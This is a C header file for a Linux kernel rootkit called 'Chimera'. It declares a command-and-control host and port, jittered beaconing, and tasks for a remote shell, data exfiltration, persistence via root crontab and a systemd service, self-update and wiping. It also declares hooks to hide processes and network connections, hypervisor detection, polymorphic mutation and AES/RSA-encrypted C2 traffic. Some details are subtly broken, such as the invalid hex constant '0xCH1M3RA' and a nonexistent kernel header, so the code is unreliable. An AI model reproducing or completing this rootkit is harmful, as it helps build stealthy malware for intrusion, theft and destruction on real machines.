#ifndef CHIMERA_H
#define CHIMERA_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/hidden.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/cred.h>
#include <linux/uio.h>
#include <linux/version.h>
#include <asm/paravirt.h>
#include <asm/msr.h>
#include <crypto/skcipher.h>
#include <crypto/akcipher.h>
#include <crypto/hash.h>
#include <linux/scatterlist.h>
#include <linux/random.h>

#define CHIMERA_MAGIC      0xCH1M3RA
#define C2_HOST            "192.168.1.100"
#define C2_PORT            443
#define BEACON_BASE_MS     30000    /* 30s base interval */
#define BEACON_JITTER_PCT  0.30     /* ±30% randomization */
#define AES_KEY_SIZE       32
#define AES_BLOCK_SIZE     16
#define RSA_KEY_SIZE       256      /* 2048-bit */
#define HIDDEN_PID_FILE    "/proc/chimera_pid"
#define PERSIST_CRON_PATH  "/var/spool/cron/crontabs/root"
#define PERSIST_SYSTEMD    "/etc/systemd/system/chimera.service"

enum task_type {
    TASK_HEARTBEAT   = 0x01,
    TASK_SHELL       = 0x02,
    TASK_EXFIL       = 0x03,
    TASK_PERSIST     = 0x04,
    TASK_UPDATE      = 0x05,
    TASK_WIPE        = 0x06
};

struct c2_frame {
    __be32 magic;
    __be32 seq;
    __be16 type;
    __be16 length;
    __u8   payload[];
} __packed;

struct poly_state {
    __u8 xor_key[AES_KEY_SIZE];
    __u32 shift_reg;
    __u8 generation;
    __u64 text_start;
    __u32 text_len;
};

struct hv_info {
    int detected;
    char vendor[16];
    int cpuid_leaf1;
    int msr_vmxon;
    int rdtsc_variance;
};

struct chimera_state {
    pid_t hide_pid;
    struct poly_state poly;
    struct hv_info hv;
    __u8 session_key[AES_KEY_SIZE];
    __u8 aes_iv[AES_BLOCK_SIZE];
    __u32 seq_num;
    struct mutex beacon_lock;
    struct task_struct *beacon_thread;
    int running;
};

extern struct chimera_state g_state;

extern struct proc_ops original_proc_fops;
extern int (*orig_tcp4_seq_show)(struct seq_file *, void *);

int  rk_init_hooks(void);
void rk_cleanup_hooks(void);
int  rk_hide_pid(pid_t pid);
void rk_unhide_pid(pid_t pid);
int  rk_beacon_start(void);
void rk_beacon_stop(void);
int  rk_hv_detect(struct hv_info *out);
int  rk_mem_guard_init(void);
void rk_mem_guard_cleanup(void);
void rk_polymorph_mutate(struct poly_state *ps);
int  rk_persist_install(void);

int  aes256_init(const __u8 *key, const __u8 *iv);
int  aes256_encrypt(const __u8 *in, __u8 *out, size_t len);
int  aes256_decrypt(const __u8 *in, __u8 *out, size_t len);
int  rsa_encrypt_session_key(const __u8 *session_key, __u8 *out, size_t *out_len);

#endif
